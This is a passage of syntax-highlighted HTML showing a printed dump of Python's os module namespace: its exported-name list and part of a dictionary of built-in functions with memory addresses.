class="string">&#x27;defpath&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;devnull&#x27;</span>, <span class="string">&#x27;SEEK_SET&#x27;</span>, <span class="string">&#x27;SEEK_CUR&#x27;</span>, <span class="string">&#x27;SEEK_END&#x27;</span>, <span class="string">&#x27;fsencode&#x27;</span>, <span class="string">&#x27;fsdecode&#x27;</span>, <span class="string">&#x27;get_exec_path&#x27;</span>, <span class="string">&#x27;fdopen&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;extsep&#x27;</span>, <span class="string">&#x27;_exit&#x27;</span>, <span class="string">&#x27;CLD_CONTINUED&#x27;</span>, <span class="string">&#x27;CLD_DUMPED&#x27;</span>, <span class="string">&#x27;CLD_EXITED&#x27;</span>, <span class="string">&#x27;CLD_KILLED&#x27;</span>, <span class="string">&#x27;CLD_STOPPED&#x27;</span>, <span class="string">&#x27;CLD_TRAPPED&#x27;</span>, <span class="string">&#x27;DirEntry&#x27;</span>, <span class="string">&#x27;EX_CANTCREAT&#x27;</span>, <span class="string">&#x27;EX_CONFIG&#x27;</span>, <span class="string">&#x27;EX_DATAERR&#x27;</span>, <span class="string">&#x27;EX_IOERR&#x27;</span>, <span class="string">&#x27;EX_NOHOST&#x27;</span>, <span class="string">&#x27;EX_NOINPUT&#x27;</span>, <span class="string">&#x27;EX_NOPERM&#x27;</span>, <span class="string">&#x27;EX_NOUSER&#x27;</span>, <span class="string">&#x27;EX_OK&#x27;</span>, <span class="string">&#x27;EX_OSERR&#x27;</span>, <span class="string">&#x27;EX_OSFILE&#x27;</span>, <span class="string">&#x27;EX_PROTOCOL&#x27;</span>, <span class="string">&#x27;EX_SOFTWARE&#x27;</span>, <span class="string">&#x27;EX_TEMPFAIL&#x27;</span>, <span class="string">&#x27;EX_UNAVAILABLE&#x27;</span>, <span class="string">&#x27;EX_USAGE&#x27;</span>, <span class="string">&#x27;F_LOCK&#x27;</span>, <span class="string">&#x27;F_OK&#x27;</span>, <span class="string">&#x27;F_TEST&#x27;</span>, <span class="string">&#x27;F_TLOCK&#x27;</span>, <span class="string">&#x27;F_ULOCK&#x27;</span>, <span class="string">&#x27;GRND_NONBLOCK&#x27;</span>, <span class="string">&#x27;GRND_RANDOM&#x27;</span>, <span class="string">&#x27;MFD_ALLOW_SEALING&#x27;</span>, <span class="string">&#x27;MFD_CLOEXEC&#x27;</span>, <span class="string">&#x27;MFD_HUGETLB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_16GB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_16MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_1GB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_1MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_256MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_2GB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_2MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_32MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_512KB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_512MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_64KB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_8MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_MASK&#x27;</span>, <span class="string">&#x27;MFD_HUGE_SHIFT&#x27;</span>, <span class="string">&#x27;NGROUPS_MAX&#x27;</span>, <span class="string">&#x27;O_ACCMODE&#x27;</span>, <span class="string">&#x27;O_APPEND&#x27;</span>, <span class="string">&#x27;O_ASYNC&#x27;</span>, <span class="string">&#x27;O_CLOEXEC&#x27;</span>, <span class="string">&#x27;O_CREAT&#x27;</span>, <span class="string">&#x27;O_DIRECT&#x27;</span>, <span class="string">&#x27;O_DIRECTORY&#x27;</span>, <span class="string">&#x27;O_DSYNC&#x27;</span>, <span class="string">&#x27;O_EXCL&#x27;</span>, <span class="string">&#x27;O_LARGEFILE&#x27;</span>, <span class="string">&#x27;O_NDELAY&#x27;</span>, <span class="string">&#x27;O_NOATIME&#x27;</span>, <span class="string">&#x27;O_NOCTTY&#x27;</span>, <span class="string">&#x27;O_NOFOLLOW&#x27;</span>, <span class="string">&#x27;O_NONBLOCK&#x27;</span>, <span class="string">&#x27;O_PATH&#x27;</span>, <span class="string">&#x27;O_RDONLY&#x27;</span>, <span class="string">&#x27;O_RDWR&#x27;</span>, <span class="string">&#x27;O_RSYNC&#x27;</span>, <span class="string">&#x27;O_SYNC&#x27;</span>, <span class="string">&#x27;O_TMPFILE&#x27;</span>, <span class="string">&#x27;O_TRUNC&#x27;</span>, <span class="string">&#x27;O_WRONLY&#x27;</span>, <span class="string">&#x27;POSIX_FADV_DONTNEED&#x27;</span>, <span class="string">&#x27;POSIX_FADV_NOREUSE&#x27;</span>, <span class="string">&#x27;POSIX_FADV_NORMAL&#x27;</span>, <span class="string">&#x27;POSIX_FADV_RANDOM&#x27;</span>, <span class="string">&#x27;POSIX_FADV_SEQUENTIAL&#x27;</span>, <span class="string">&#x27;POSIX_FADV_WILLNEED&#x27;</span>, <span class="string">&#x27;POSIX_SPAWN_CLOSE&#x27;</span>, <span class="string">&#x27;POSIX_SPAWN_DUP2&#x27;</span>, <span class="string">&#x27;POSIX_SPAWN_OPEN&#x27;</span>, <span class="string">&#x27;PRIO_PGRP&#x27;</span>, <span class="string">&#x27;PRIO_PROCESS&#x27;</span>, <span class="string">&#x27;PRIO_USER&#x27;</span>, <span class="string">&#x27;P_ALL&#x27;</span>, <span class="string">&#x27;P_PGID&#x27;</span>, <span class="string">&#x27;P_PID&#x27;</span>, <span class="string">&#x27;P_PIDFD&#x27;</span>, <span class="string">&#x27;RTLD_DEEPBIND&#x27;</span>, <span class="string">&#x27;RTLD_GLOBAL&#x27;</span>, <span class="string">&#x27;RTLD_LAZY&#x27;</span>, <span class="string">&#x27;RTLD_LOCAL&#x27;</span>, <span class="string">&#x27;RTLD_NODELETE&#x27;</span>, <span class="string">&#x27;RTLD_NOLOAD&#x27;</span>, <span class="string">&#x27;RTLD_NOW&#x27;</span>, <span class="string">&#x27;RWF_DSYNC&#x27;</span>, <span class="string">&#x27;RWF_HIPRI&#x27;</span>, <span class="string">&#x27;RWF_NOWAIT&#x27;</span>, <span class="string">&#x27;RWF_SYNC&#x27;</span>, <span class="string">&#x27;R_OK&#x27;</span>, <span class="string">&#x27;SCHED_BATCH&#x27;</span>, <span class="string">&#x27;SCHED_FIFO&#x27;</span>, <span class="string">&#x27;SCHED_IDLE&#x27;</span>, <span class="string">&#x27;SCHED_OTHER&#x27;</span>, <span class="string">&#x27;SCHED_RESET_ON_FORK&#x27;</span>, <span class="string">&#x27;SCHED_RR&#x27;</span>, <span class="string">&#x27;SEEK_DATA&#x27;</span>, <span class="string">&#x27;SEEK_HOLE&#x27;</span>, <span class="string">&#x27;ST_APPEND&#x27;</span>, <span class="string">&#x27;ST_MANDLOCK&#x27;</span>, <span class="string">&#x27;ST_NOATIME&#x27;</span>, <span class="string">&#x27;ST_NODEV&#x27;</span>, <span class="string">&#x27;ST_NODIRATIME&#x27;</span>, <span class="string">&#x27;ST_NOEXEC&#x27;</span>, <span class="string">&#x27;ST_NOSUID&#x27;</span>, <span class="string">&#x27;ST_RDONLY&#x27;</span>, <span class="string">&#x27;ST_RELATIME&#x27;</span>, <span class="string">&#x27;ST_SYNCHRONOUS&#x27;</span>, <span class="string">&#x27;ST_WRITE&#x27;</span>, <span class="string">&#x27;TMP_MAX&#x27;</span>, <span class="string">&#x27;WCONTINUED&#x27;</span>, <span class="string">&#x27;WCOREDUMP&#x27;</span>, <span class="string">&#x27;WEXITED&#x27;</span>, <span class="string">&#x27;WEXITSTATUS&#x27;</span>, <span class="string">&#x27;WIFCONTINUED&#x27;</span>, <span class="string">&#x27;WIFEXITED&#x27;</span>, <span class="string">&#x27;WIFSIGNALED&#x27;</span>, <span class="string">&#x27;WIFSTOPPED&#x27;</span>, <span class="string">&#x27;WNOHANG&#x27;</span>, <span class="string">&#x27;WNOWAIT&#x27;</span>, <span class="string">&#x27;WSTOPPED&#x27;</span>, <span class="string">&#x27;WSTOPSIG&#x27;</span>, <span class="string">&#x27;WTERMSIG&#x27;</span>, <span class="string">&#x27;WUNTRACED&#x27;</span>, <span class="string">&#x27;W_OK&#x27;</span>, <span class="string">&#x27;XATTR_CREATE&#x27;</span>, <span class="string">&#x27;XATTR_REPLACE&#x27;</span>, <span class="string">&#x27;XATTR_SIZE_MAX&#x27;</span>, <span class="string">&#x27;X_OK&#x27;</span>, <span class="string">&#x27;abort&#x27;</span>, <span class="string">&#x27;access&#x27;</span>, <span class="string">&#x27;chdir&#x27;</span>, <span class="string">&#x27;chmod&#x27;</span>, <span class="string">&#x27;chown&#x27;</span>, <span class="string">&#x27;chroot&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;closerange&#x27;</span>, <span class="string">&#x27;confstr&#x27;</span>, <span class="string">&#x27;confstr_names&#x27;</span>, <span class="string">&#x27;copy_file_range&#x27;</span>, <span class="string">&#x27;cpu_count&#x27;</span>, <span class="string">&#x27;ctermid&#x27;</span>, <span class="string">&#x27;device_encoding&#x27;</span>, <span class="string">&#x27;dup&#x27;</span>, <span class="string">&#x27;dup2&#x27;</span>, <span class="string">&#x27;environ&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;execv&#x27;</span>, <span class="string">&#x27;execve&#x27;</span>, <span class="string">&#x27;fchdir&#x27;</span>, <span class="string">&#x27;fchmod&#x27;</span>, <span class="string">&#x27;fchown&#x27;</span>, <span class="string">&#x27;fdatasync&#x27;</span>, <span class="string">&#x27;fork&#x27;</span>, <span class="string">&#x27;forkpty&#x27;</span>, <span class="string">&#x27;fpathconf&#x27;</span>, <span class="string">&#x27;fspath&#x27;</span>, <span class="string">&#x27;fstat&#x27;</span>, <span class="string">&#x27;fstatvfs&#x27;</span>, <span class="string">&#x27;fsync&#x27;</span>, <span class="string">&#x27;ftruncate&#x27;</span>, <span class="string">&#x27;get_blocking&#x27;</span>, <span class="string">&#x27;get_inheritable&#x27;</span>, <span class="string">&#x27;get_terminal_size&#x27;</span>, <span class="string">&#x27;getcwd&#x27;</span>, <span class="string">&#x27;getcwdb&#x27;</span>, <span class="string">&#x27;getegid&#x27;</span>, <span class="string">&#x27;geteuid&#x27;</span>, <span class="string">&#x27;getgid&#x27;</span>, <span class="string">&#x27;getgrouplist&#x27;</span>, <span class="string">&#x27;getgroups&#x27;</span>, <span class="string">&#x27;getloadavg&#x27;</span>, <span class="string">&#x27;getlogin&#x27;</span>, <span class="string">&#x27;getpgid&#x27;</span>, <span class="string">&#x27;getpgrp&#x27;</span>, <span class="string">&#x27;getpid&#x27;</span>, <span class="string">&#x27;getppid&#x27;</span>, <span class="string">&#x27;getpriority&#x27;</span>, <span class="string">&#x27;getrandom&#x27;</span>, <span class="string">&#x27;getresgid&#x27;</span>, <span class="string">&#x27;getresuid&#x27;</span>, <span class="string">&#x27;getsid&#x27;</span>, <span class="string">&#x27;getuid&#x27;</span>, <span class="string">&#x27;getxattr&#x27;</span>, <span class="string">&#x27;initgroups&#x27;</span>, <span class="string">&#x27;isatty&#x27;</span>, <span class="string">&#x27;kill&#x27;</span>, <span class="string">&#x27;killpg&#x27;</span>, <span class="string">&#x27;lchown&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;listdir&#x27;</span>, <span class="string">&#x27;listxattr&#x27;</span>, <span class="string">&#x27;lockf&#x27;</span>, <span class="string">&#x27;lseek&#x27;</span>, <span class="string">&#x27;lstat&#x27;</span>, <span class="string">&#x27;major&#x27;</span>, <span class="string">&#x27;makedev&#x27;</span>, <span class="string">&#x27;memfd_create&#x27;</span>, <span class="string">&#x27;minor&#x27;</span>, <span class="string">&#x27;mkdir&#x27;</span>, <span class="string">&#x27;mkfifo&#x27;</span>, <span class="string">&#x27;mknod&#x27;</span>, <span class="string">&#x27;nice&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;openpty&#x27;</span>, <span class="string">&#x27;pathconf&#x27;</span>, <span class="string">&#x27;pathconf_names&#x27;</span>, <span class="string">&#x27;pidfd_open&#x27;</span>, <span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;pipe2&#x27;</span>, <span class="string">&#x27;posix_fadvise&#x27;</span>, <span class="string">&#x27;posix_fallocate&#x27;</span>, <span class="string">&#x27;posix_spawn&#x27;</span>, <span class="string">&#x27;posix_spawnp&#x27;</span>, <span class="string">&#x27;pread&#x27;</span>, <span class="string">&#x27;preadv&#x27;</span>, <span class="string">&#x27;putenv&#x27;</span>, <span class="string">&#x27;pwrite&#x27;</span>, <span class="string">&#x27;pwritev&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;readlink&#x27;</span>, <span class="string">&#x27;readv&#x27;</span>, <span class="string">&#x27;register_at_fork&#x27;</span>, <span class="string">&#x27;remove&#x27;</span>, <span class="string">&#x27;removexattr&#x27;</span>, <span class="string">&#x27;rename&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;rmdir&#x27;</span>, <span class="string">&#x27;scandir&#x27;</span>, <span class="string">&#x27;sched_get_priority_max&#x27;</span>, <span class="string">&#x27;sched_get_priority_min&#x27;</span>, <span class="string">&#x27;sched_getaffinity&#x27;</span>, <span class="string">&#x27;sched_getparam&#x27;</span>, <span class="string">&#x27;sched_getscheduler&#x27;</span>, <span class="string">&#x27;sched_param&#x27;</span>, <span class="string">&#x27;sched_rr_get_interval&#x27;</span>, <span class="string">&#x27;sched_setaffinity&#x27;</span>, <span class="string">&#x27;sched_setparam&#x27;</span>, <span class="string">&#x27;sched_setscheduler&#x27;</span>, <span class="string">&#x27;sched_yield&#x27;</span>, <span class="string">&#x27;sendfile&#x27;</span>, <span class="string">&#x27;set_blocking&#x27;</span>, <span class="string">&#x27;set_inheritable&#x27;</span>, <span class="string">&#x27;setegid&#x27;</span>, <span class="string">&#x27;seteuid&#x27;</span>, <span class="string">&#x27;setgid&#x27;</span>, <span class="string">&#x27;setgroups&#x27;</span>, <span class="string">&#x27;setpgid&#x27;</span>, <span class="string">&#x27;setpgrp&#x27;</span>, <span class="string">&#x27;setpriority&#x27;</span>, <span class="string">&#x27;setregid&#x27;</span>, <span class="string">&#x27;setresgid&#x27;</span>, <span class="string">&#x27;setresuid&#x27;</span>, <span class="string">&#x27;setreuid&#x27;</span>, <span class="string">&#x27;setsid&#x27;</span>, <span class="string">&#x27;setuid&#x27;</span>, <span class="string">&#x27;setxattr&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;stat_result&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;statvfs_result&#x27;</span>, <span class="string">&#x27;strerror&#x27;</span>, <span class="string">&#x27;symlink&#x27;</span>, <span class="string">&#x27;sync&#x27;</span>, <span class="string">&#x27;sysconf&#x27;</span>, <span class="string">&#x27;sysconf_names&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;tcgetpgrp&#x27;</span>, <span class="string">&#x27;tcsetpgrp&#x27;</span>, <span class="string">&#x27;terminal_size&#x27;</span>, <span class="string">&#x27;times&#x27;</span>, <span class="string">&#x27;times_result&#x27;</span>, <span class="string">&#x27;truncate&#x27;</span>, <span class="string">&#x27;ttyname&#x27;</span>, <span class="string">&#x27;umask&#x27;</span>, <span class="string">&#x27;uname&#x27;</span>, <span class="string">&#x27;uname_result&#x27;</span>, <span class="string">&#x27;unlink&#x27;</span>, <span class="string">&#x27;unsetenv&#x27;</span>, <span class="string">&#x27;urandom&#x27;</span>, <span class="string">&#x27;utime&#x27;</span>, <span class="string">&#x27;wait&#x27;</span>, <span class="string">&#x27;wait3&#x27;</span>, <span class="string">&#x27;wait4&#x27;</span>, <span class="string">&#x27;waitid&#x27;</span>, <span class="string">&#x27;waitid_result&#x27;</span>, <span class="string">&#x27;waitpid&#x27;</span>, <span class="string">&#x27;waitstatus_to_exitcode&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;writev&#x27;</span>, <span class="string">&#x27;makedirs&#x27;</span>, <span class="string">&#x27;removedirs&#x27;</span>, <span class="string">&#x27;renames&#x27;</span>, <span class="string">&#x27;walk&#x27;</span>, <span class="string">&#x27;fwalk&#x27;</span>, <span class="string">&#x27;execl&#x27;</span>, <span class="string">&#x27;execle&#x27;</span>, <span class="string">&#x27;execlp&#x27;</span>, <span class="string">&#x27;execlpe&#x27;</span>, <span class="string">&#x27;execvp&#x27;</span>, <span class="string">&#x27;execvpe&#x27;</span>, <span class="string">&#x27;getenv&#x27;</span>, <span class="string">&#x27;supports_bytes_environ&#x27;</span>, <span class="string">&#x27;environb&#x27;</span>, <span class="string">&#x27;getenvb&#x27;</span>, <span class="string">&#x27;P_WAIT&#x27;</span>, <span class="string">&#x27;P_NOWAIT&#x27;</span>, <span class="string">&#x27;P_NOWAITO&#x27;</span>, <span class="string">&#x27;spawnv&#x27;</span>, <span class="string">&#x27;spawnve&#x27;</span>, <span class="string">&#x27;spawnvp&#x27;</span>, <span class="string">&#x27;spawnvpe&#x27;</span>, <span class="string">&#x27;spawnl&#x27;</span>, <span class="string">&#x27;spawnle&#x27;</span>, <span class="string">&#x27;spawnlp&#x27;</span>, <span class="string">&#x27;spawnlpe&#x27;</span>], <span class="string">&#x27;_exists&#x27;</span>: &lt;function _exists at <span class="number">0x7fc7ef5478b0</span>&gt;, <span class="string">&#x27;_get_exports_list&#x27;</span>: &lt;function _get_exports_list at <span class="number">0x7fc7ef547ca0</span>&gt;, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;linesep&#x27;</span>: <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>: &lt;built-<span class="keyword">in</span> function stat&gt;, <span class="string">&#x27;access&#x27;</span>: &lt;built-<span class="keyword">in</span> function access&gt;, <span class="string">&#x27;ttyname&#x27;</span>: &lt;built-<span class="keyword">in</span> function ttyname&gt;, <span class="string">&#x27;chdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function chdir&gt;, <span class="string">&#x27;chmod&#x27;</span>: &lt;built-<span class="keyword">in</span> function chmod&gt;, <span class="string">&#x27;fchmod&#x27;</span>: &lt;built-<span class="keyword">in</span> function fchmod&gt;, <span class="string">&#x27;chown&#x27;</span>: &lt;built-<span class="keyword">in</span> function chown&gt;, <span class="string">&#x27;fchown&#x27;</span>: &lt;built-<span class="keyword">in</span> function fchown&gt;, <span class="string">&#x27;lchown&#x27;</span>: &lt;built-<span class="keyword">in</span> function lchown&gt;, <span class="string">&#x27;chroot&#x27;</span>: &lt;built-<span class="keyword">in</span> function chroot&gt;, <span class="string">&#x27;ctermid&#x27;</span>: &lt;built-<span class="keyword">in</span> function ctermid&gt;, <span class="string">&#x27;getcwd&#x27;</span>: &lt;built-<span class="keyword">in</span> function getcwd&gt;, <span class="string">&#x27;getcwdb&#x27;</span>: &lt;built-<span class="keyword">in</span> function getcwdb&gt;, <span class="string">&#x27;link&#x27;</span>: &lt;built-<span class="keyword">in</span> function link&gt;, <span class="string">&#x27;listdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function listdir&gt;, <span class="string">&#x27;lstat&#x27;</span>: &lt;built-<span class="keyword">in</span> function lstat&gt;, <span class="string">&#x27;mkdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function mkdir&gt;, <span class="string">&#x27;nice&#x27;</span>: &lt;built-<span class="keyword">in</span> function nice&gt;, <span class="string">&#x27;getpriority&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpriority&gt;, <span class="string">&#x27;setpriority&#x27;</span>: &lt;built-<span class="keyword">in</span> function setpriority&gt;, <span class="string">&#x27;posix_spawn&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_spawn&gt;, <span class="string">&#x27;posix_spawnp&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_spawnp&gt;, <span class="string">&#x27;readlink&#x27;</span>: &lt;built-<span class="keyword">in</span> function readlink&gt;, <span class="string">&#x27;copy_file_range&#x27;</span>: &lt;built-<span class="keyword">in</span> function copy_file_range&gt;, <span class="string">&#x27;rename&#x27;</span>: &lt;built-<span class="keyword">in</span> function rename&gt;, <span class="string">&#x27;replace&#x27;</span>: &lt;built-<span class="keyword">in</span> function replace&gt;, <span class="string">&#x27;rmdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function rmdir&gt;, <span class="string">&#x27;symlink&#x27;</span>: &lt;built-<span class="keyword">in</span> function symlink&gt;, <span class="string">&#x27;system&#x27;</span>: &lt;built-<span class="keyword">in</span> function system&gt;, <span class="string">&#x27;umask&#x27;</span>: &lt;built-<span class="keyword">in</span> function umask&gt;, <span class="string">&#x27;uname&#x27;</span>: &lt;built-<span class="keyword">in</span> function uname&gt;, <span class="string">&#x27;unlink&#x27;</span>: &lt;built-<span class="keyword">in</span> function unlink&gt;, <span class="string">&#x27;remove&#x27;</span>: &lt;built-<span class="keyword">in</span> function remove&gt;, <span class="string">&#x27;utime&#x27;</span>: &lt;built-<span class="keyword">in</span> function utime&gt;, <span class="string">&#x27;times&#x27;</span>: &lt;built-<span class="keyword">in</span> function times&gt;, <span class="string">&#x27;execv&#x27;</span>: &lt;built-<span class="keyword">in</span> function execv&gt;, <span class="string">&#x27;execve&#x27;</span>: &lt;built-<span class="keyword">in</span> function execve&gt;, <span class="string">&#x27;fork&#x27;</span>: &lt;built-<span class="keyword">in</span> function fork&gt;, <span class="string">&#x27;register_at_fork&#x27;</span>: &lt;built-<span class="keyword">in</span> function register_at_fork&gt;, <span class="string">&#x27;sched_get_priority_max&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_get_priority_max&gt;, <span class="string">&#x27;sched_get_priority_min&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_get_priority_min&gt;, <span class="string">&#x27;sched_getparam&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_getparam&gt;, <span class="string">&#x27;sched_getscheduler&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_getscheduler&gt;, <span class="string">&#x27;sched_rr_get_interval&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_rr_get_interval&gt;, <span class="string">&#x27;sched_setparam&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_setparam&gt;, <span class="string">&#x27;sched_setscheduler&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_setscheduler&gt;, <span class="string">&#x27;sched_yield&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_yield&gt;, <span class="string">&#x27;sched_setaffinity&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_setaffinity&gt;, <span class="string">&#x27;sched_getaffinity&#x27;</span>: &lt;built-<span class="keyword">in</span> function sched_getaffinity&gt;, <span class="string">&#x27;openpty&#x27;</span>: &lt;built-<span class="keyword">in</span> function openpty&gt;, <span class="string">&#x27;forkpty&#x27;</span>: &lt;built-<span class="keyword">in</span> function forkpty&gt;, <span class="string">&#x27;getegid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getegid&gt;, <span class="string">&#x27;geteuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function geteuid&gt;, <span class="string">&#x27;getgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getgid&gt;, <span class="string">&#x27;getgrouplist&#x27;</span>: &lt;built-<span class="keyword">in</span> function getgrouplist&gt;, <span class="string">&#x27;getgroups&#x27;</span>: &lt;built-<span class="keyword">in</span> function getgroups&gt;, <span class="string">&#x27;getpid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpid&gt;, <span class="string">&#x27;getpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpgrp&gt;, <span class="string">&#x27;getppid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getppid&gt;, <span class="string">&#x27;getuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getuid&gt;, <span class="string">&#x27;getlogin&#x27;</span>: &lt;built-<span class="keyword">in</span> function getlogin&gt;, <span class="string">&#x27;kill&#x27;</span>: &lt;built-<span class="keyword">in</span> function kill&gt;, <span class="string">&#x27;killpg&#x27;</span>: &lt;built-<span class="keyword">in</span> function killpg&gt;, <span class="string">&#x27;setuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setuid&gt;, <span class="string">&#x27;seteuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function seteuid&gt;, <span class="string">&#x27;setreuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setreuid&gt;, <span class="string">&#x27;setgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setgid&gt;, <span class="string">&#x27;setegid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setegid&gt;, <span class="string">&#x27;setregid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setregid&gt;, <span class="string">&#x27;setgroups&#x27;</span>: &lt;built-<span class="keyword">in</span> function setgroups&gt;, <span class="string">&#x27;initgroups&#x27;</span>: &lt;built-<span class="keyword">in</span> function initgroups&gt;, <span class="string">&#x27;getpgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getpgid&gt;, <span class="string">&#x27;setpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function setpgrp&gt;, <span class="string">&#x27;wait&#x27;</span>: &lt;built-<span class="keyword">in</span> function wait&gt;, <span class="string">&#x27;wait3&#x27;</span>: &lt;built-<span class="keyword">in</span> function wait3&gt;, <span class="string">&#x27;wait4&#x27;</span>: &lt;built-<span class="keyword">in</span> function wait4&gt;, <span class="string">&#x27;waitid&#x27;</span>: &lt;built-<span class="keyword">in</span> function waitid&gt;, <span class="string">&#x27;waitpid&#x27;</span>: &lt;built-<span class="keyword">in</span> function waitpid&gt;, <span class="string">&#x27;pidfd_open&#x27;</span>: &lt;built-<span class="keyword">in</span> function pidfd_open&gt;, <span class="string">&#x27;getsid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getsid&gt;, <span class="string">&#x27;setsid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setsid&gt;, <span class="string">&#x27;setpgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setpgid&gt;, <span class="string">&#x27;tcgetpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function tcgetpgrp&gt;, <span class="string">&#x27;tcsetpgrp&#x27;</span>: &lt;built-<span class="keyword">in</span> function tcsetpgrp&gt;, <span class="string">&#x27;open&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, <span class="string">&#x27;close&#x27;</span>: &lt;built-<span class="keyword">in</span> function close&gt;, <span class="string">&#x27;closerange&#x27;</span>: &lt;built-<span class="keyword">in</span> function closerange&gt;, <span class="string">&#x27;device_encoding&#x27;</span>: &lt;built-<span class="keyword">in</span> function device_encoding&gt;, <span class="string">&#x27;dup&#x27;</span>: &lt;built-<span class="keyword">in</span> function dup&gt;, <span class="string">&#x27;dup2&#x27;</span>: &lt;built-<span class="keyword">in</span> function dup2&gt;, <span class="string">&#x27;lockf&#x27;</span>: &lt;built-<span class="keyword">in</span> function lockf&gt;, <span class="string">&#x27;lseek&#x27;</span>: &lt;built-<span class="keyword">in</span> function lseek&gt;, <span class="string">&#x27;read&#x27;</span>: &lt;built-<span class="keyword">in</span> function read&gt;, <span class="string">&#x27;readv&#x27;</span>: &lt;built-<span class="keyword">in</span> function readv&gt;, <span class="string">&#x27;pread&#x27;</span>: &lt;built-<span class="keyword">in</span> function pread&gt;, <span class="string">&#x27;preadv&#x27;</span>: &lt;built-<span class="keyword">in</span> function preadv&gt;, <span class="string">&#x27;write&#x27;</span>: &lt;built-<span class="keyword">in</span> function write&gt;, <span class="string">&#x27;writev&#x27;</span>: &lt;built-<span class="keyword">in</span> function writev&gt;, <span class="string">&#x27;pwrite&#x27;</span>: &lt;built-<span class="keyword">in</span> function pwrite&gt;, <span class="string">&#x27;pwritev&#x27;</span>: &lt;built-<span class="keyword">in</span> function pwritev&gt;, <span class="string">&#x27;sendfile&#x27;</span>: &lt;built-<span class="keyword">in</span> function sendfile&gt;, <span class="string">&#x27;fstat&#x27;</span>: &lt;built-<span class="keyword">in</span> function fstat&gt;, <span class="string">&#x27;isatty&#x27;</span>: &lt;built-<span class="keyword">in</span> function isatty&gt;, <span class="string">&#x27;pipe&#x27;</span>: &lt;built-<span class="keyword">in</span> function pipe&gt;, <span class="string">&#x27;pipe2&#x27;</span>: &lt;built-<span class="keyword">in</span> function pipe2&gt;, <span class="string">&#x27;mkfifo&#x27;</span>: &lt;built-<span class="keyword">in</span> function mkfifo&gt;, <span class="string">&#x27;mknod&#x27;</span>: &lt;built-<span class="keyword">in</span> function mknod&gt;, <span class="string">&#x27;major&#x27;</span>: &lt;built-<span class="keyword">in</span> function major&gt;, <span class="string">&#x27;minor&#x27;</span>: &lt;built-<span class="keyword">in</span> function minor&gt;, <span class="string">&#x27;makedev&#x27;</span>: &lt;built-<span class="keyword">in</span> function makedev&gt;, <span class="string">&#x27;ftruncate&#x27;</span>: &lt;built-<span class="keyword">in</span> function ftruncate&gt;, <span class="string">&#x27;truncate&#x27;</span>: &lt;built-<span class="keyword">in</span> function truncate&gt;, <span class="string">&#x27;posix_fallocate&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_fallocate&gt;, <span class="string">&#x27;posix_fadvise&#x27;</span>: &lt;built-<span class="keyword">in</span> function posix_fadvise&gt;, <span class="string">&#x27;putenv&#x27;</span>: &lt;built-<span class="keyword">in</span> function putenv&gt;, <span class="string">&#x27;unsetenv&#x27;</span>: &lt;built-<span class="keyword">in</span> 